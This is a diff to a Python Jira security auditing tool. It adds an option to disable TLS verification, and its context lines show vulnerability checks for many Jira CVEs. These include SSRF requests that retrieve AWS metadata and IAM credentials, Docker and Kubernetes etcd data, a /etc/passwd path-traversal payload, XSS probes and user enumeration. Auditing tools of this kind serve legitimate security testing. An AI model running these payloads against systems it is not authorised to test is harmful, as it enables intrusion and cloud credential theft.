@@ -9,7 +9,7 @@ import time
 from urllib.parse import urlparse
 from config import *
 import argparse
-
+import urllib3
 
 
 
@@ -18,12 +18,12 @@ import argparse
 
 def clean_url(url):
     while url.endswith("/"):
-        url=url[0:-1]    
+        url=url[0:-1]
     return url
-        
+
 
 def detect_version(base_url):
-    r=requests.get(f"{base_url}/rest/api/latest/serverInfo",allow_redirects=False,headers=headers)
+    r=requests.get(f"{base_url}/rest/api/latest/serverInfo",allow_redirects=False,headers=headers,verify=verify_ssl)
     try:
         server_data=json.loads(str(r.content,'utf-8'))
         print('\n')
@@ -35,8 +35,8 @@ def detect_version(base_url):
         print(" [*] Deployment Type --> ",server_data.get("deploymentType"))
         print(" [*] Build Number --> ",server_data.get("buildNumber"))
         print(" [*] Database Build Number --> ",server_data.get("databaseBuildNumber"))
-    
-        
+
+
         try:
             print(" [*] Host Address -->",socket.gethostbyaddr(urlparse(base_url).netloc)[0])
         except:
@@ -55,11 +55,11 @@ def detect_version(base_url):
     except Exception as e:
         print(f"{RED}An Unexpected Error Occured:{RESET} {e}")
 
-    
+
 def isaws(base_url):
     try:
         if "amazonaws" in socket.gethostbyaddr(urlparse(base_url).netloc)[0]:
-            return True 
+            return True
         else:
             return False
     except:
@@ -72,7 +72,7 @@ def isaws(base_url):
 
 def CVE_2017_9506(base_url): #(SSRF):
     to_load="https://google.com"
-    r=requests.get(f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={to_load}",allow_redirects=False,headers=headers)
+    r=requests.get(f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={to_load}",allow_redirects=False,headers=headers,verify=verify_ssl)
     if r.status_code==200 and "googlelogo" in str(r.content):
         print(f"{RED}[+] {GREEN} [CRITICAL] {RESET} Vulnerable To CVE-2017-9506 (SSRF) : {base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={to_load}\n")
         response.append(f"[+] [CRITICAL] Vulnerable To CVE-2017-9506 (SSRF) : {base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={to_load}\n")
@@ -82,19 +82,19 @@ def CVE_2017_9506(base_url): #(SSRF):
             print("\tExfiltrating Data from the Insatance")
             to_load="http://169.254.169.254/latest/meta-data/"
             print("\n\tDUMPING AWS INSTANCE DATA ")
-            r=requests.get(f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_INSTANCE}",allow_redirects=False,headers=headers)
+            r=requests.get(f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_INSTANCE}",allow_redirects=False,headers=headers,verify=verify_ssl)
             aws_instance=str(r.content,'utf-8')
             if r.status_code == 200:
                 print(f"\tAWS INSTANCE Recovered : {base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_INSTANCE}")
 
             print("\n\tDUMPING AWS METADATA ")
-            r=requests.get(f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_METADATA}",allow_redirects=False,headers=headers)
+            r=requests.get(f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_METADATA}",allow_redirects=False,headers=headers,verify=verify_ssl)
             aws_metadata=str(r.content,'utf-8')
             if r.status_code == 200:
                 print(f"\tAWS Metadata Recovered : {base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_METADATA}")
 
             print("\n\tDUMPING AWS IAM DATA ")
-            r=requests.get(f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_IAM_DATA}",allow_redirects=False,headers=headers)
+            r=requests.get(f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_IAM_DATA}",allow_redirects=False,headers=headers,verify=verify_ssl)
             aws_iam_data=str(r.content,'utf-8')
             if r.status_code == 200:
                 print(f"\tAWS IAM DATA Recovered : {base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_IAM_DATA}\n")
@@ -108,19 +108,19 @@ def CVE_2017_9506(base_url): #(SSRF):
 
         to_load="http://100.100.100.200/latest/meta-data/"
         print("\tChecking for Alibaba Metadata Exfiltration")
-        r=requests.get(f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={to_load}",allow_redirects=False,headers=headers)
+        r=requests.get(f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={to_load}",allow_redirects=False,headers=headers,verify=verify_ssl)
         if r.status_code == 200:
             print(f"\t----> Alibaba Metadata Recovered : {base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={to_load}")
 
         to_load="http://127.0.0.1:2375/v1.24/containers/json"
         print("\tChecking for Docker Container Lists")
-        r=requests.get(f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={to_load}",allow_redirects=False,headers=headers)
+        r=requests.get(f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={to_load}",allow_redirects=False,headers=headers,verify=verify_ssl)
         if r.status_code == 200:
             print(f"\t----> Docker Lists Found : {base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={to_load}")
 
         to_load="http://127.0.0.1:2379/v2/keys/?recursive=true"
         print("\tChecking Kubernetes ETCD API keys")
-        r=requests.get(f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={to_load}",allow_redirects=False,headers=headers)
+        r=requests.get(f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={to_load}",allow_redirects=False,headers=headers,verify=verify_ssl)
         if r.status_code == 200:
             print(f"\t-----> Kubernetes ETCD API keys Found : {base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={to_load}")
 
@@ -128,7 +128,7 @@ def CVE_2017_9506(base_url): #(SSRF):
         print(f"{GRAY}[-] Not Vulnerable To CVE-2017-9506")
 
 def CVE_2019_8449(base_url): # User Info Disclosure:
-    r=requests.get(f"{base_url}/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true",allow_redirects=False,headers=headers)
+    r=requests.get(f"{base_url}/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true",allow_redirects=False,headers=headers,verify=verify_ssl)
     #print(str(r.content))
     if r.status_code==200:
         if "You are not authenticated. Authentication required to perform this operation." in str(r.content):
@@ -141,7 +141,7 @@ def CVE_2019_8449(base_url): # User Info Disclosure:
 
 
 def CVE_2019_8442(base_url): #(Sensitive info disclosure):
-    r=requests.get(f"{base_url}/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml", allow_redirects=False,headers=headers)
+    r=requests.get(f"{base_url}/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml", allow_redirects=False,headers=headers,verify=verify_ssl)
     if r.status_code != 200:
         print(f"{GRAY}[-] Not Vulnerable To CVE-2019-8442\n")
     else:
@@ -149,7 +149,7 @@ def CVE_2019_8442(base_url): #(Sensitive info disclosure):
         response.append(f"[+] [LOW] Vulnerable To CVE-2019-8442 : {base_url}/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml\n")
 
 def CVE_2019_8443(base_url): #(Sensitive info disclosure):
-    r=requests.get(f"{base_url}/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml", allow_redirects=False,headers=headers)
+    r=requests.get(f"{base_url}/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml", allow_redirects=False,headers=headers,verify=verify_ssl)
     if r.status_code == 200 or "<project" in str(r.content):
         print(f"{RED}[+] {GREEN} [LOW]{RESET} Vulnerable To CVE-2019-8443 : {base_url}/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml\n")
         response.append(f"[+] [LOW] Vulnerable To CVE-2019-8443 : {base_url}/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml\n")
@@ -158,7 +158,7 @@ def CVE_2019_8443(base_url): #(Sensitive info disclosure):
 
 def CVE_2019_8451(base_url): #(SSRF):
     to_load="https://google.com"
-    r=requests.get(f"{base_url}/plugins/servlet/gadgets/makeRequest?url={to_load}",allow_redirects=False,headers=headers)
+    r=requests.get(f"{base_url}/plugins/servlet/gadgets/makeRequest?url={to_load}",allow_redirects=False,headers=headers,verify=verify_ssl)
     if r.status_code==200 and "googlelogo" in str(r.content):
         print(f"{RED}[+] {GREEN} [CRITICAL]{RESET} Vulnerable To CVE-2019-8451 (SSRF) : {base_url}/plugins/servlet/gadgets/makeRequest?url={to_load}\n")
         response.append(f"[+] [CRITICAL] Vulnerable To CVE-2019-8451 (SSRF) : {base_url}/plugins/servlet/gadgets/makeRequest?url={to_load}\n")
@@ -168,19 +168,19 @@ def CVE_2019_8451(base_url): #(SSRF):
             print("\tExfiltrating Data from the Insatance")
             to_load="http://169.254.169.254/latest/meta-data/"
             print("\nDUMPING AWS INSTANCE DATA ")
-            r=requests.get(f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_INSTANCE}",allow_redirects=False,headers=headers)
+            r=requests.get(f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_INSTANCE}",allow_redirects=False,headers=headers,verify=verify_ssl)
             aws_instance=str(r.content,'utf-8')
             if r.status_code == 200:
                 print(f"\tAWS INSTANCE Recovered : {base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_INSTANCE}")
 
             print("\n\tDUMPING AWS METADATA ")
-            r=requests.get(f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_METADATA}",allow_redirects=False,headers=headers)
+            r=requests.get(f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_METADATA}",allow_redirects=False,headers=headers,verify=verify_ssl)
             aws_metadata=str(r.content,'utf-8')
             if r.status_code == 200:
                 print(f"AWS Metadata Recovered : {base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_METADATA}")
 
             print("\n\tDUMPING AWS IAM DATA ")
-            r=requests.get(f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_IAM_DATA}",allow_redirects=False,headers=headers)
+            r=requests.get(f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_IAM_DATA}",allow_redirects=False,headers=headers,verify=verify_ssl)
             aws_iam_data=str(r.content,'utf-8')
             if r.status_code == 200:
                 print(f"\tAWS IAM DATA Recovered : {base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_IAM_DATA}\n")
@@ -193,19 +193,19 @@ def CVE_2019_8451(base_url): #(SSRF):
 
         to_load="http://100.100.100.200/latest/meta-data/"
         print("\tChecking for Alibaba Metadata Exfiltration")
-        r=requests.get(f"{base_url}/plugins/servlet/gadgets/makeRequest?url={to_load}",allow_redirects=False,headers=headers)
+        r=requests.get(f"{base_url}/plugins/servlet/gadgets/makeRequest?url={to_load}",allow_redirects=False,headers=headers,verify=verify_ssl)
         if r.status_code == 200:
             print(f"\tAlibaba Metadata Recovered : {base_url}/plugins/servlet/gadgets/makeRequest?url={to_load}")
 
         to_load="http://127.0.0.1:2375/v1.24/containers/json"
         print("\tChecking for Docker Container Lists")
-        r=requests.get(f"{base_url}/plugins/servlet/gadgets/makeRequest?url={to_load}",allow_redirects=False,headers=headers)
+        r=requests.get(f"{base_url}/plugins/servlet/gadgets/makeRequest?url={to_load}",allow_redirects=False,headers=headers,verify=verify_ssl)
         if r.status_code == 200:
             print(f"\tDocker Lists Found : {base_url}/plugins/servlet/gadgets/makeRequest?url={to_load}")
 
         to_load="http://127.0.0.1:2379/v2/keys/?recursive=true"
         print("\tChecking Kubernetes ETCD API keys\n")
-        r=requests.get(f"{base_url}/plugins/servlet/gadgets/makeRequest?url={to_load}",allow_redirects=False,headers=headers)
+        r=requests.get(f"{base_url}/plugins/servlet/gadgets/makeRequest?url={to_load}",allow_redirects=False,headers=headers,verify=verify_ssl)
         if r.status_code == 200:
             print(f"\tKubernetes ETCD API keys Found : {base_url}/plugins/servlet/gadgets/makeRequest?url={to_load}\n")
 
@@ -213,7 +213,7 @@ def CVE_2019_8451(base_url): #(SSRF):
         print(f"{GRAY}[-] Not Vulnerable To CVE-2019-8451\n")
 
 def CVE_2019_3403(base_url): #(User enum):
-    r=requests.get(f"{base_url}/rest/api/2/user/picker?query=admin", allow_redirects=False,headers=headers)
+    r=requests.get(f"{base_url}/rest/api/2/user/picker?query=admin", allow_redirects=False,headers=headers,verify=verify_ssl)
     #print(str(r.content))
     if "The user named \'{0}\' does not exist" or "errorMessages" in str(r.content):
         print(f"{GRAY}[-] Not Vulnerable To CVE-2019-3403\n")
@@ -223,7 +223,7 @@ def CVE_2019_3403(base_url): #(User enum):
 
 
 def CVE_2019_3402(base_url): #XSS in the labels gadget:
-    r=requests.get(f"{base_url}/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=x2rnu%3Cscript%3Ealert(\"XSS\")%3C%2fscript%3Et1nmk&Search=Search", allow_redirects=False,headers=headers)
+    r=requests.get(f"{base_url}/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=x2rnu%3Cscript%3Ealert(\"XSS\")%3C%2fscript%3Et1nmk&Search=Search", allow_redirects=False,headers=headers,verify=verify_ssl)
     if "XSS" in str(r.content):
         print(f"{RED}[+] {GREEN} [HIGH]{RESET} Vulnerable To CVE-2019-3402 [Maybe] : {base_url}/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=x2rnu%3Cscript%3Ealert(\"XSS\")%3C%2fscript%3Et1nmk&Search=Search\n")
         response.append(f"[+] [HIGH]  Vulnerable To CVE-2019-3402 [Maybe] {base_url}/secure/ConfigurePortal: {base_url}/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=x2rnu%3Cscript%3Ealert(\"XSS\")%3C%2fscript%3Et1nmk&Search=Search\n")
@@ -232,7 +232,7 @@ def CVE_2019_3402(base_url): #XSS in the labels gadget:
 
 
 def  CVE_2019_11581(base_url): #(SSTI):
-    r=requests.get(f"{base_url}/secure/ContactAdministrators!default.jspa", allow_redirects=False)
+    r=requests.get(f"{base_url}/secure/ContactAdministrators!default.jspa", allow_redirects=False,verify=verify_ssl)
     if r.status_code==200:
         if "Your Jira administrator" or "Contact Site Administrators"  in str(r.content):
             print(f"{GRAY}[-] Not Vulnerable To CVE-2019-11581\n")
@@ -243,7 +243,7 @@ def  CVE_2019_11581(base_url): #(SSTI):
         print(f"{GRAY}[-] Not Vulnerable To CVE-2019-11581\n")
 
 def CVE_2020_14179(base_url): #(Info disclosure):
-    r=requests.get(f"{base_url}/secure/QueryComponent!Default.jspa",allow_redirects=False,headers=headers)
+    r=requests.get(f"{base_url}/secure/QueryComponent!Default.jspa",allow_redirects=False,headers=headers,verify=verify_ssl)
     if r.status_code != 200:
         print(f"{GRAY}[-] Not Vulnerable To CVE-2020-14179\n")
     else:
@@ -252,7 +252,7 @@ def CVE_2020_14179(base_url): #(Info disclosure):
 
 
 def CVE_2020_14181(base_url): #(User enum):
-    r=requests.get(f"{base_url}/secure/ViewUserHover.jspa?username=Admin",allow_redirects=False,headers=headers)
+    r=requests.get(f"{base_url}/secure/ViewUserHover.jspa?username=Admin",allow_redirects=False,headers=headers,verify=verify_ssl)
     if r.status_code !=200 or "Your session has timed out" in str(r.content):
         print(f"{GRAY}[-] Not Vulnerable To CVE-2020-14181\n")
     else:
@@ -262,7 +262,7 @@ def CVE_2020_14181(base_url): #(User enum):
 
 def CVE_2018_20824(base_url): #(XSS):
     print("\n")
-    r=requests.get(f"{base_url}/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(\"XSS_POPUP\")",allow_redirects=False,headers=headers)
+    r=requests.get(f"{base_url}/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(\"XSS_POPUP\")",allow_redirects=False,headers=headers,verify=verify_ssl)
     if "XSS_POPUP" in str(r.content):
         print(f"{RED}[+] {GREEN} [HIGH]{RESET} Vulnerable To CVE-2018-20824 : {base_url}/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)\n")
         response.append(f"[+] [HIGH] Vulnerable To CVE-2018-20824 : {base_url}/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)\n")
@@ -272,11 +272,11 @@ def CVE_2018_20824(base_url): #(XSS):
 
 def CVE_2019_3396(base_url): #(Path Traversal & RCE):
     body = ' {"contentId":"1","macro":{"name":"widget","params":{"url":"https://google.com","width":"1000","height":"1000","_template":"file:///etc/passwd"},"body":""}} '
-    r=requests.get(f"{base_url}/rest/tinymce/1/macro/preview", allow_redirects=False,headers=headers)
+    r=requests.get(f"{base_url}/rest/tinymce/1/macro/preview", allow_redirects=False,headers=headers,verify=verify_ssl)
     if r.status_code != 200:
         print(f"{GRAY}[-] Not Vulnerable To CVE-2019-3396\n")
     else:
-        r=requests.post(f"{base_url}/rest/tinymce/1/macro/preview", data=body,headers=headers)
+        r=requests.post(f"{base_url}/rest/tinymce/1/macro/preview", data=body,headers=headers,verify=verify_ssl)
         if "root" in str(r.content):
             print(f"{RED}[+] {GREEN} [CRITICAL]{RESET} Vulnerable To CVE-2019-3396 : {base_url}/rest/tinymce/1/macro/preview\n")
             response.append(f"{RED}[+] [CRITICAL] Vulnerable To CVE-2019-3396 : {base_url}/rest/tinymce/1/macro/preview\n")
@@ -300,26 +300,26 @@ def CVE_2020_36287_helper(base_url):
     with open('helper.txt','a') as no:
         for i in range(10000,10500):
             no.write(str(i)+'\n')
-    
+
     with open('helper.txt','r') as op:
-        threads=[] 
-    
+        threads=[]
+
         for num in op:
             t=threading.Thread(target=CVE_2020_36287,args=(base_url,num.strip()))
             t.start()
             threads.append(t)
         for tt in threads:
             tt.join()
-            
+
     if len(response_CVE_2020_36287) != 0:
         filename=f"CVE-2020-36287_{urlparse(url).netloc}.txt"
         with open(f"{output_folder}{filename}",'a') as res:
-            
+
             for i in range(0,len(response_CVE_2020_36287)):
                 res.write(response_CVE_2020_36287[i])
     else:
         pass
-    
+
     os.remove("helper.txt")
 
 def CVE_2020_36287_helper_2():
@@ -332,7 +332,7 @@ def CVE_2020_36287_helper_2():
 
 
 def CVE_2020_36289(base_url):
-    r=requests.get(f"{base_url}/jira/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin")
+    r=requests.get(f"{base_url}/jira/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin",verify=verify_ssl)
     #print("\n")
     if r.status_code ==200:
         if "Assignee" in str(r.content):
@@ -358,7 +358,7 @@ def CVE_2020_36289(base_url):
 
 def user_reg(base_url):
     try:
-        r=requests.get(f"{base_url}/secure/Signup!default.jspa",allow_redirects=False)
+        r=requests.get(f"{base_url}/secure/Signup!default.jspa",allow_redirects=False, verify=verify_ssl)
         if r.status_code ==200:
             if "private"  in str(r.content):
                 print(f"{GRAY}[-] User regestration is Disabled{RESET}\n")
@@ -374,7 +374,7 @@ def user_reg(base_url):
 
 
 def dev_mode(base_url):
-    r=requests.get(f"{base_url}/",allow_redirects=False)
+    r=requests.get(f"{base_url}/",allow_redirects=False,verify=verify_ssl)
     if r.status_code ==200:
         if "<meta name=\"ajs-dev-mode\" content=\"true\">"  in str(r.content):
             print(f"{RED}[+] {GREEN} [LOW]{RESET} Dev Mode is Enabled : {base_url}/ {RESET}\n")
@@ -550,31 +550,31 @@ def worker(url):
         base_url=clean_url(url)
         detect_version(base_url)
         is_aws=isaws(base_url)
-        CVE_2017_9506(base_url) 
+        CVE_2017_9506(base_url)
         CVE_2018_20824(base_url)
         CVE_2019_3402(base_url)
-        CVE_2019_3403(base_url) 
-        CVE_2019_3396(base_url) 
-        CVE_2019_8442(base_url) 
-        CVE_2019_8443(base_url) 
-        CVE_2019_8449(base_url) 
-        CVE_2019_8451(base_url) 
+        CVE_2019_3403(base_url)
+        CVE_2019_3396(base_url)
+        CVE_2019_8442(base_url)
+        CVE_2019_8443(base_url)
+        CVE_2019_8449(base_url)
+        CVE_2019_8451(base_url)
         CVE_2019_11581(base_url)
         CVE_2020_14179(base_url)
         CVE_2020_14181(base_url)
-        CVE_2020_36287_helper(base_url) 
-        CVE_2020_36287_helper_2() 
-        CVE_2020_36289(base_url) 
-        Unauth_User_picker(base_url) 
-        Unauth_Resolutions(base_url) 
-        Unauth_Projects(base_url) 
+        CVE_2020_36287_helper(base_url)
+        CVE_2020_36287_helper_2()
+        CVE_2020_36289(base_url)
+        Unauth_User_picker(base_url)
+        Unauth_Resolutions(base_url)
+        Unauth_Projects(base_url)
         Unauth_Project_categories(base_url)
-        Unauth_Dashboard(base_url)  
+        Unauth_Dashboard(base_url)
         Unauth_Dashboard_admin(base_url)
         Service_desk_signup(base_url)
         Unauth_Install_Gadgets(base_url)
-        user_reg(base_url) 
-        Unauth_Group_Picker(base_url) 
+        user_reg(base_url)
+        Unauth_Group_Picker(base_url)
         Unauth_Screens(base_url)
         FieldNames_QueryComponentJql(base_url)
         write_response(response)
@@ -596,12 +596,15 @@ def main():
         global output_folder
         global is_aws
         global base_url
-        parser = argparse.ArgumentParser(description="Jira-Lens : Jira Security Auditing Tool") 
+        global verify_ssl
+        verify_ssl=True
+        parser = argparse.ArgumentParser(description="Jira-Lens : Jira Security Auditing Tool")
         parser.add_argument("-u","--url", help="Target URL",dest='url')
         parser.add_argument('-f','--file',type=argparse.FileType('r'),dest='input_file')
         parser.add_argument('-c','--cookie',help="Provide authentication cookie(s)")
         parser.add_argument('-o','--output',help="Output Folder for files",default="output/",required=False)
-         
+        parser.add_argument('-i', '--insecure', help="Output Folder for files", action="store_true", required=False)
+
         args= parser.parse_args()
         banner()
         url=args.url
@@ -613,14 +616,19 @@ def main():
         if args.url == None and args.input_file==None:
             print(f"{RED}\tNo URL Provided\n\tUse -u/--url to provide an URL")
             sys.exit(0)
-    
+
         if args.url != None and args.input_file!=None:
             print(f"{RED}\tMultiple Inputs Provided\n\tUse Either -u(URL) or -f(FILE) as Input")
             sys.exit(0)
 
         if args.cookie:
             headers['Cookie'] = args.cookie
-    
+
+        if args.insecure:
+            print(f"{RED}\tSSL errors will be turned off because the -i(insecure) flag is used.")
+            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+            verify_ssl=False
+
         if args.input_file:
             print(f" {CYAN}Input File Provided : {args.input_file.name}{RESET}\n\n")
             input_file=args.input_file.name
@@ -636,6 +644,7 @@ def main():
                         uselesscounter=False
                     url=url.strip()
                     worker(url)
+
         else:
             url=args.url
             worker(url)
@@ -645,7 +654,7 @@ def main():
         sys.exit(0)
     except Exception as e:
         print(f"{RED}An Unexpected Error Occured:{RESET} {e}")
-    
+
 
 
 
@@ -657,7 +666,7 @@ if __name__=="__main__":
         response=[]
         global is_aws
         global url
-        main() 
+        main()
 
     except KeyboardInterrupt:
         print (f"{RED} Keyboard Interrupt Detected {RESET}")
